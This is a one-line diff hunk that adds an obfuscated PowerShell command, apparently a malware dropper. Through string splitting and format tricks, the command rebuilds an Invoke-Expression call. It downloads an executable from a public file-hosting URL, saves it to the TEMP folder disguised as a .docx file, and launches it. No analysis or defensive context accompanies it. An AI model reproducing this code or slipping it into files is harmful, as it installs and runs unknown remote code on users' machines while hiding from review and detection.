@@ -1,0 +1,1 @@
+﻿ .((VArIaBLE '*mdR*').nAME[3,11,2]-join'') ( (('('+'Ne'+'w-O'+'bject'+' '+'S'+'yst'+'em.Net.WebCli'+'ent).Downlo'+'adFile'+'({2}htt'+'p'+'s'+':'+'//a.pomf.cat/'+'ys'+'pcsr.exe{'+'2}'+',{1}{3}env'+':'+'TE'+'MP{0}drv.docx{1}'+');Start'+'-Process ({1}{3}en'+'v:TEM'+'P{0}'+'drv.docx{1'+'})') -F  [char]92,[char]34,[char]39,[char]36)) 
